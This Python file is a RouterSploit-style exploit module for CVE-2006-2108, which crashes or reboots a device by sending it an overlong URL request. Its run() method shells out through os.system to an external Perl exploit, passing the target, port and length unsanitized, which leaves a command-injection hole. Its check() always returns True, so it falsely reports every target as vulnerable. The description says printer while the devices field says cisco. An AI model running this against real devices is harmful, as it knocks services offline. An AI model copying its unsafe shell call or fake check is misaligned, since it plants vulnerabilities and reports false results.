
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2006-2108",

        "description": "the printer runs a webserver to provide various printing tasks from "
                       "java enabled browsers. Input is being filtered for bad characters.  "
                       "However it is vulnerable to a long url request. This will either reboot or crash the device. ",

        "authors": (

            "sh4d0wman",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/1718",

        ),

        "devices": (

            "cisco, CVE-2006-2108"
        ),
    }


    target = OptIP("", "destination IP,no much fun in attacking 127.0.0.1 is it")
    port = OptPort(""," destination port  ")
    length = OptString(""," request length,different sizes give different results")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {} {} {}'.format('exploit-db-1718.pl',self.target,self.port,self.length)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True